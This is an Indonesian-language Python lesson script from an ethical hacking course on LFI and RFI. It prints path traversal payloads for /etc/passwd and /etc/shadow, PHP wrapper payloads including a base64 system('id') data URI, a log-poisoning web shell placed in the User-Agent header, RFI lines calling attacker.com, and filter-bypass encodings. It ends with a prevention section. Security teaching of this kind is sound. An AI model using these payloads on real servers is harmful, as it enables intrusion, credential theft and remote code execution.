#!/usr/bin/env python3
"""Sesi 15: LFI & RFI — Local & Remote File Inclusion"""

import subprocess
import sys
import os
from datetime import datetime


def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — Sesi 15")
    print("  LFI & RFI — Local & Remote File Inclusion")
    print("=" * 60)
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("=" * 60)


def check_tool(name):
    try:
        subprocess.check_output([name, "--version"], stderr=subprocess.STDOUT, timeout=5)
        return "✅ TERINSTAL"
    except (subprocess.CalledProcessError, FileNotFoundError, OSError):
        try:
            subprocess.check_output(["which", name], stderr=subprocess.STDOUT, timeout=5)
            return "✅ TERINSTAL"
        except (subprocess.CalledProcessError, FileNotFoundError, OSError):
            return "❌ TIDAK TERINSTAL"


def section(num, title):
    print(f"\n{'─' * 50}")
    print(f"  [{num}] {title}")
    print(f"{'─' * 50}")


# ── [1] Apa itu File Inclusion? ──
def file_inclusion_overview():
    print("""
  💡 FILE INCLUSION adalah kerentanan web yang terjadi ketika
     aplikasi menyertakan file berdasarkan input user tanpa validasi.

   ╔═══════════════════════════════════════════════════════╗
   ║  📝 PUSTAKAWAN TERLALU NURUT                        ║
   ║     Bayangkan: Kamu ke perpustakaan. Kamu minta     ║
   ║     buku "Rahasia Negara" — tapi pustakawan nurut   ║
   ║     aja ngasih tanpa ngecek izin.                    ║
   ║     Itulah LFI! Pustakawan terlalu nurut!            ║
   ╚═══════════════════════════════════════════════════════╝

  2 TIPE:
    • LFI (Local File Inclusion) → Baca file di server lokal
    • RFI (Remote File Inclusion)→ Sertakan file dari server remote
    """)


# ── [2] LFI Concept & Demo ──
def lfi_concept():
    print("  💡 LFI — Local File Inclusion:\n")

    print("""
  Cara kerja:
  1. Aplikasi punya parameter path file: ?file=about.php
  2. Attacker ubah jadi: ?file=../../../etc/passwd
  3. Server membaca file sistem yang seharusnya tidak terekspos
  4. Isi file bocor ke attacker!

  Contoh URL rentan:
    http://target.com/index.php?page=about
    http://target.com/index.php?file=news.txt
    http://target.com/?template=default
    http://target.com/?include=footer.php
    """)

    print("  Demo LFI — Path Traversal:\n")

    # Simulasi path traversal
    target_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/var/log/apache2/access.log",
        "/proc/self/environ",
        "/proc/net/tcp",
        "/etc/os-release",
    ]

    print(f"  {'Target File':<35} {'Payload Contoh':<45} {'Info Bocor':<25}")
    print(f"  {'─' * 105}")
    traversals = [
        ("/etc/passwd",  "?file=../../../etc/passwd",         "User & hash info"),
        ("/etc/shadow",  "?file=../../../etc/shadow",         "Password hash (crackable)"),
        ("/proc/net/tcp","?file=../../../proc/net/tcp",       "Koneksi TCP aktif"),
        ("/etc/os-release","?file=../../../etc/os-release",   "Info OS server"),
        ("apache log",   "?file=../../../var/log/apache2/access.log", "Log poisoning!"),
    ]
    for target, payload, info in traversals:
        print(f"  {target:<35} {payload:<45} {info:<25}")
    print()

    print("  ✅ Coba baca /etc/os-release asli:\n")
    try:
        with open("/etc/os-release", "r") as f:
            content = f.read().strip()
        for line in content.split("\n")[:5]:
            print(f"     {line}")
    except Exception as e:
        print(f"     ❌ Gagal baca: {e}")
    print()


# ── [3] php://filter Wrapper ──
def php_filter_wrapper():
    print("  💡 PHP FILTER WRAPPER — Baca Source Code:\n")

    print("""
  🔥 php://filter memungkinkan attacker membaca SOURCE CODE
     file PHP (yang biasanya tidak tampil, karena dieksekusi server).

  Kenapa ini berbahaya?
    • Baca source code → cari kerentanan lain
    • Baca database config → credential bocor
    • Baca API key / secret → akses service lain

  Payload:
    ?file=php://filter/convert.base64-encode/resource=config.php

  Server akan:
    1. Baca config.php sebagai STRING (bukan dieksekusi)
    2. Encode ke base64
    3. Tampilkan di halaman → attacker tinggal decode
    """)

    print("  Demo php://filter:\n")

    # Simulasi source code yang bisa dibaca
    fake_source = """<?php
$db_host = "localhost";
$db_user = "root";
$db_pass = "sup3rS3cr3t!";
$db_name = "app_database";
$api_key = "sk_live_abc123xyz";
?>"""

    import base64
    encoded = base64.b64encode(fake_source.encode()).decode()
    decoded = base64.b64decode(encoded).decode()

    print(f"  {'Langkah':<40} {'Output':<40}")
    print(f"  {'─' * 80}")
    print(f"  {'Source asli (tersembunyi)':<40} {'[TIDAK TAMPAK — dieksekusi server]':<40}")
    print(f"  {'php://filter encode':<40} {encoded[:37] + '...':<40}")
    print(f"  {'Base64 decode hasil':<40} {decoded[:37] + '...':<40}")
    print()

    print("  🔥 Wrapper PHP lain yang berguna:\n")
    print(f"  {'Wrapper':<30} {'Kegunaan':<45} {'Contoh':<35}")
    print(f"  {'─' * 110}")
    wrappers = [
        ("php://filter",     "Baca source code dengan encoding",       "php://filter/convert.base64-encode/resource=index.php"),
        ("php://input",      "Kirim data POST sebagai input file",     "?file=php://input + POST body: <?php system('id');?>"),
        ("data://",          "Sisipkan data inline sebagai file",      "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+"),
        ("expect://",        "Eksekusi command (butuh extension)",     "?file=expect://id"),
        ("zip://",           "Baca file dalam archive ZIP",            "?file=zip://./shell.jpg#shell"),
        ("phar://",          "Deserialization via PHAR file",          "?file=phar://./upload/file.jpg"),
    ]
    for wrapper, kegunaan, contoh in wrappers:
        print(f"  {wrapper:<30} {kegunaan:<45} {contoh:<35}")
    print()


# ── [4] Log Poisoning ──
def log_poisoning():
    print("  💡 LOG POISONING — Ubah Log Jadi Shell:\n")

    print("""
  🔥 Log Poisoning = Menyuntikkan PHP code ke file log server,
     kemudian meng-include file log tersebut via LFI.

  Langkah-langkah:
  1. Kirim request dengan payload PHP di header User-Agent
  2. Server mencatat ke access log: <?php system($_GET['cmd']); ?>
  3. Include access.log via LFI: ?file=../../../var/log/apache2/access.log
  4. Tambahkan &cmd=id → log dieksekusi sebagai PHP!
    """)

    print("  Demo Log Poisoning:\n")

    print("  ① Attacker kirim request dengan User-Agent jahat:\n")
    print(f"     {'Request':<25} {'Isi':<55}")
    print(f"     {'─' * 80}")
    user_agent_payload = "<?php system($_GET['cmd']); ?>"
    referer_payload = "http://target.com/<?php echo shell_exec($_GET['cmd']); ?>"
    print(f"     {'User-Agent:':<25} {user_agent_payload:<55}")
    print(f"     {'Referer:':<25} {referer_payload:<55}")
    print()

    print("  ② Server catat ke access.log:\n")
    fake_log = """192.168.1.1 - - [12/Jul/2025:10:30:15] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"
192.168.1.1 - - [12/Jul/2025:10:30:16] "GET /index.php?file=../../../var/log/apache2/access.log&cmd=id HTTP/1.1" 200 5678 "-" "<?php system($_GET['cmd']); ?>"
192.168.1.1 - - [12/Jul/2025:10:30:17] "GET /index.php?file=../../../var/log/apache2/access.log&cmd=ls%20-la%20/etc HTTP/1.1" 200 5678 "-" "<?php system($_GET['cmd']); ?>"
192.168.1.1 - - [12/Jul/2025:10:30:18] "GET /index.php?file=../../../var/log/apache2/access.log&cmd=cat%20/etc/passwd HTTP/1.1" 200 5678 "-" "<?php system($_GET['cmd']); ?>"
    """
    print(f"     {fake_log}")

    print("  ③ Include log via LFI → PHP code di log tereksekusi!\n")
    print("     💡 Syarat Log Poisoning:")
    print("        • Tahu lokasi file log (default: /var/log/apache2/access.log)")
    print("        • Log file bisa dibaca oleh web user (www-data)")
    print("        • PHP code tidak di-escape saat dicatat (jarang, tapi ada)")
    print()


# ── [5] RFI Concept ──
def rfi_concept():
    print("  💡 RFI — Remote File Inclusion:\n")

    print("""
  ╔═══════════════════════════════════════════════════════╗
  ║  🍽️  MAKANAN CATERING                                ║
  ║     Bayangkan: Catering kantor, siapa aja boleh      ║
  ║     bawa makanan dari luar. Orang jahat bisa bawa    ║
  ║     makanan beracun!                                  ║
  ║                                                        ║
  ║     RFI = Attacker menyertakan file REMOTE (dari      ║
  ║     server luar) yang berisi code berbahaya!          ║
  ╚═══════════════════════════════════════════════════════╝

  Contoh:
    ?file=http://attacker.com/evil.txt
    ?file=https://pastebin.com/raw/abc123
    ?file=\\\\attacker\\shared\\evil.php

  🔥 RFI biasanya bisa langsung → Remote Code Execution (RCE)!
    """)

    print("  Cek allow_url_include:\n")

    # Coba cek php config via system file
    print(f"  {'Directive PHP':<30} {'Lokasi':<40} {'Keterangan':<35}")
    print(f"  {'─' * 105}")
    print(f"  {'allow_url_include':<30} {'php.ini':<40} {'Jika On → RFI MUNGKIN!':<35}")
    print(f"  {'allow_url_fopen':<30} {'php.ini':<40} {'Jika On → allow_url_include bisa aktif':<35}")
    print(f"  {'display_errors':<30} {'php.ini':<40} {'Jika On → informasi bocor':<35}")
    print()

    print("  💡 RFI vs LFI:\n")
    print(f"  {'Aspek':<25} {'LFI':<40} {'RFI':<40}")
    print(f"  {'─' * 105}")
    rfi_vs = [
        ("Sumber file",  "File di server LOKAL",       "File dari server REMOTE"),
        ("Tingkat bahaya","Sedang (baca file aja)",    "Tinggi (RCE langsung)"),
        ("Konfigurasi",  "allow_url_include = Tidak perlu","allow_url_include = HARUS On"),
        ("Fungsi rentan","include(), include_once()",   "include(), include_once()"),
        ("Dampak max",   "Source code bocor, RCE(log poisoning)","RCE langsung, full compromise"),
    ]
    for aspek, lfi, rfi in rfi_vs:
        print(f"  {aspek:<25} {lfi:<40} {rfi:<40}")
    print()


# ── [6] Tool Check ──
def tool_check():
    print("  💡 TOOLS UNTUK FILE INCLUSION:\n")

    tools = [
        ("dotdotpwn",    "Path traversal fuzzer"),  # usually as perl script or pacman
        ("kadimus",      "LFI scanner & exploit tool"),
        ("Burp Suite",   "Web proxy (manual testing)"),
        ("wfuzz",        "Fuzzing untuk parameter LFI"),
        ("gobuster",     "Directory/file brute force"),
        ("ffuf",         "Fast web fuzzer"),
    ]

    print(f"  {'Tool':<20} {'Fungsi':<40} {'Status':<20}")
    print(f"  {'─' * 80}")
    for tool_name, fungsi in tools:
        status = check_tool(tool_name)
        print(f"  {tool_name:<20} {fungsi:<40} {status:<20}")
    print()


# ── [7] Prevention Table ──
def prevention():
    print("  💡 PENCEGAHAN FILE INCLUSION:\n")

    print(f"  {'Metode':<30} {'Penjelasan':<55} {'Efektivitas':<20}")
    print(f"  {'─' * 105}")
    preventions = [
        ("Whitelist Path",     "Hanya izinkan file tertentu yang valid",     "✅ Sangat efektif"),
        ("Disable wrapper",    "Matikan allow_url_include di php.ini",        "✅ Sangat efektif"),
        ("Path sanitization",  "Hapus ../, ..\\, dan null byte (%00)",         "⚠️ Bisa di-bypass"),
        ("Basename validation","Cek nama file di akhir path, bukan full path","⚠️ Bisa di-bypass"),
        ("OpenBSD-style",      "Gunakan realpath() lalu cek prefix",          "✅ Efektif"),
        ("Chroot/Jail",        "Web server diisolasi dalam direktori terbatas","✅ Sangat efektif"),
        ("WAF/IDS",            "Deteksi pola path traversal (../, php://)",   "⚠️ Bisa di-bypass"),
        ("Least Privilege",     "Web user hanya baca file yang diperlukan",   "✅ Efektif"),
    ]
    for metode, penjelasan, efektif in preventions:
        print(f"  {metode:<30} {penjelasan:<55} {efektif:<20}")
    print()

    print("  🔥 Code example (secure):\n")
    print("""    <?php
    $allowed_pages = ['home', 'about', 'contact', 'profile'];
    $page = $_GET['page'] ?? 'home';

    if (in_array($page, $allowed_pages)) {
        include \"pages/{$page}.php\";
    } else {
        include \"pages/error.php\";
    }
    ?>
    """)


# ── [8] Analogi ──
def analogi():
    print("""
   ╔══════════════════════════════════════════════════════════╗
   ║   📝 ANALOGI LENGKAP FILE INCLUSION                    ║
   ║                                                        ║
   ║   LFI (Path Traversal) = PUSTAKAWAN TERLALU NURUT      ║
   ║     Kamu minta buku di luar rak yang diizinkan,        ║
   ║     pustakawan tetap ngasih. (../../../etc/passwd)     ║
   ║                                                        ║
   ║   php://filter = Fotokopi buku PELAJARAN               ║
   ║     Kamu minta buku "rahasia", difotokopi, dan         ║
   ║     fotokopiannya dibocorin. (source code terlihat!)    ║
   ║                                                        ║
   ║   Log Poisoning = Nulis di papan pengumuman            ║
   ║     Terus papan pengumuman itu dibaca semua orang.     ║
   ║     (Request header dicatat ke log, lalu log di-include)║
   ║                                                        ║
   ║   RFI = MAKANAN CATERING                               ║
   ║     Siapa aja boleh bawa makanan dari luar —           ║
   ║     termasuk makanan beracun! (remote shell!)          ║
   ╚══════════════════════════════════════════════════════════╝
    """)


def main():
    banner()

    # ── [1] File Inclusion Overview ──
    section(1, "APA ITU FILE INCLUSION?")
    file_inclusion_overview()

    # ── [2] LFI Concept ──
    section(2, "LOCAL FILE INCLUSION (LFI)")
    lfi_concept()

    # ── [3] PHP Filter Wrapper ──
    section(3, "PHP FILTER WRAPPER")
    php_filter_wrapper()

    # ── [4] Log Poisoning ──
    section(4, "LOG POISONING")
    log_poisoning()

    # ── [5] RFI Concept ──
    section(5, "REMOTE FILE INCLUSION (RFI)")
    rfi_concept()

    # ── [6] Tool Check ──
    section(6, "TOOLS CHECK")
    tool_check()

    # ── [7] Prevention ──
    section(7, "PENCEGAHAN")
    prevention()

    # ── [8] Analogi ──
    section(8, "ANALOGI LENGKAP")
    analogi()

    # ── Summary ──
    print("=" * 60)
    print("  ✅ SESI 15 SELESAI!")
    print("=" * 60)
    print("  👉 Recap:")
    print("    • LFI: Baca file lokal via input parameter tidak divalidasi")
    print("    • Path Traversal: ../ untuk naik direktori, baca /etc/passwd")
    print("    • php://filter: Baca source code PHP via base64 encoding")
    print("    • Log Poisoning: Inject PHP ke log → include log → RCE")
    print("    • RFI: Sertakan file remote (butuh allow_url_include=On)")
    print("    • Tools: dotdotpwn, kadimus, wfuzz untuk LFI/RFI scanning")
    print("    • Prevention: Whitelist path, disable wrapper, sanitize input")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("    1. Cari LFI di DVWA: ?page=../../../etc/passwd")
    print("    2. Coba php://filter: ?page=php://filter/convert.base64-encode/resource=index.php")
    print("    3. Praktik log poisoning: inject User-Agent lalu include log")
    print("    4. Cek /proc/net/tcp via LFI untuk lihat koneksi server")
    print("    5. Cek apakah allow_url_include aktif di server (phpinfo)")
    print("    6. Install dotdotpwn dan scan target LFI")
    print("    7. Baca OWASP File Inclusion prevention cheat sheet")
    print("    8. Coba RFI: include file dari server kamu sendiri (lab only!)")
    print("    9. Praktik bypass: ../ → ....// → ..\\/ → %2e%2e%2f")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
